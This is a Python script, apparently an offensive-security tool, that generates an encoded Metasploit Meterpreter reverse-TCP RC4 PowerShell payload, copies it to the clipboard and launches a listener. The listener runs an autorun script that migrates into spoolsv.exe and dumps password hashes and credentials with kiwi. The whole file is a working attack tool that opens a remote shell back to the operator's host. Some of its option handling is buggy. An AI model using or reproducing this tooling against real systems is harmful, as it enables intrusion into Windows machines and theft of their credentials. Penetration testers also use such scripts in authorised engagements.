#!/usr/bin/python
# Description: Generates a MSF Reverse TCP RC4 payload encoded in Powershell to the clipboard.
# Created by: Nick Sanzotta / @beamr
# Version: rc4Gen.py v 1.0
import getopt, os, sys, pyperclip, socket
import urllib, json
from sys import argv

filePowershell = 'rc4_payload.ps1'
fileAutoscript = 'autorun_commands.rc'
filerc4listener = 'rc4_listener.rc'

def get_external_address():
	data = json.loads(urllib.urlopen("http://ip.jsontest.com/").read())
	print("External IP: "+data["ip"])
	return data["ip"]

def get_internal_address():
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.connect(("8.8.8.8", 80))
	print("Internal IP: "+s.getsockname()[0])
	return s.getsockname()[0]

def payloadGenerator(msfPayload,lhost,lport,rc4Password, verboseChoice):
	#Add try expect statment for the msfpro alternate path
	rc4 = os.system('msfvenom -p windows/meterpreter/'+msfPayload+ ' -e x86/shikata_ga_nai RC4PASSWORD='+rc4Password+' LHOST='+lhost+' LPORT='+lport+' -f psh-cmd -o ' +filePowershell)
	with open(filePowershell, 'r+') as f1:
		rc4Payload = f1.read()

	on = set(['on','yes', 'ye', ''])
	off = set(['off','of', 'no'])
	if verboseChoice in on:
		print('\nPAYLOAD: '+msfPayload)
		print('LHOST: '+lhost)
		print('LPORT: '+lport)
		print('RC4PASSWORD: '+rc4Password)
		print('\n')
		print(rc4Payload)
	elif verboseChoice in off:
		pyperclip.copy(rc4Payload)
		print('\nPayload Copied to Clipboard:')
		print('\nPAYLOAD: '+msfPayload)
		print('LHOST: '+lhost)
		print('LPORT: '+lport)
		print('RC4PASSWORD: '+rc4Password)
	else:
		sys.stdout.write("Please respond with 'ON' or 'OFF'")

def autorunscript():
	print('Create autorunscript')
	with open(fileAutoscript, 'w') as f1:
		f1.write("migrate -N spoolsv.exe\n"+\
				 "load kiwi\n"+\
				 "sysinfo\n"+\
				 "hashdump\n"+\
				 "creds_all")

def listener(msfPayload,lhost,lport,rc4Password, msflistenerChoice): 
	#Creates resource file(with autorunscripts builtin) and launches listener.
	on = set(['on','yes', 'ye', ''])
	off = set(['off','of','no'])
	if msflistenerChoice in on:
		with open(filerc4listener, 'w') as f:
			f.write("use multi/handler"+"\n"+\
					"set PAYLOAD windows/meterpreter/"+msfPayload+"\n"+\
					"set LHOST "+lhost+"\n"+\
					"set LPORT "+lport+"\n"+\
					"set Rc4PASSWORD "+rc4Password+""+"\n"+\
					"set ExitOnSession false"+"\n"+\
					"set AutoRunScript multi_console_command -rc"+fileAutoscript+"\n"+\
					"exploit -j -z")
		os.system('msfconsole -q -r '+filerc4listener)
	elif msflistenerChoice in off:
		sys.exit(2)
	else:
		sys.stdout.write("Please respond with 'ON' or 'OFF'")

def help():
	print(
		"Usage: python rc4Gen.py -l 10.0.0.25\n"+\
		"If no LHOST if defined wizard menu will be launched.")

def main(argv):
    lhost= ''
    lport = '443'
    rc4Password = 'rc4M4g1c'
    msfPayload = 'reverse_tcp_rc4'
    verboseChoice = 'off'
    msflistenerChoice = 'on'
    if not os.path.exists("/opt/rc4Gen/"):
        os.mkdir("/opt/rc4Gen/") 

    if len(argv) < 1:
    	extipAddress = get_external_address()
    	intipAddress = get_internal_address()
    	print('\n')
    	#WIZARD Menu: If no args are defined the wizard will be launched.
    	print('You did not specifiy the LHOST, wizard menu has launched:\n')

    	lhost = raw_input('Enter LHOST for payload'+'['+extipAddress+']:') or extipAddress
    	print('ENTERED: "%s"' % lhost + '\n')
    	
    	lport = raw_input('Enter LPORT for payload'+'['+lport+']:') or lport
    	print('ENTERED: "%s"' % lport + '\n')

    	rc4Password = raw_input('Enter RC4PASSWORD for payload'+'['+rc4Password+']:') or rc4Password
    	print('ENTERED: "%s"' % rc4Password + '\n')
    	
    	print('TIP: Verbosity [ON] will print payload to STDOUT.')
    	print('TIP: Verbosity [OFF] will copy payload to Clipboard.')
    	verbose = raw_input('Verbosity[OFF]:') or 'OFF'
    	verboseChoice = verbose.lower()
    	print('ENTERED: "%s"' % verboseChoice.upper() + '\n')
    	payloadGenerator(msfPayload,lhost,lport,rc4Password,verboseChoice)

    	print('TIP: Listener [ON] will automagically launch a MSF listener.')
    	msfListener = raw_input('listener[ON]:') or 'ON'
    	msfListenerChoice = msfListener.lower()
    	print('ENTERED: "%s"' % msfListenerChoice.upper() + '\n')
    	listener(msfPayload,lhost,lport,rc4Password,msflistenerChoice)

    else:
    	try:
        	opts, args = getopt.getopt(argv, 'l:p:r:v:e:h',['lhost=','lport=','rc4Password=','verbose=','listener=','help'])
            #GETOPT Menu: 
        	for opt, arg in opts:
        		if opt in ('--help'):
        			help()
        			sys.exit(2)
        		elif opt in ('-h', '--lhost'):
        			lhost = arg
        		elif opt in ('-p', '--lport'):
        			lport = arg
        		elif opt in ('-r', '--rc4Password'):
        			rc4Password = arg
        		elif opt in ('-v', '--verbose'):
        			verboseChoice = arg
        		#Executes listener
        		elif opt in ('-e','--listener'): 
        			if arg == "on":
        				payloadGenerator(msfPayload,lhost,lport,rc4Password,verboseChoice)
        				listener(msfPayload,lhost,lport,rc4Password,msflistenerChoice)
        		else:
        			help()
        			sys.exit(2)
        	payloadGenerator(msfPayload,lhost,lport,rc4Password,verboseChoice)
        	autorunscript()
    	
    	except getopt.GetoptError:
        	help()
        	sys.exit(2)
    

if __name__ == "__main__":
    main(argv[1:])
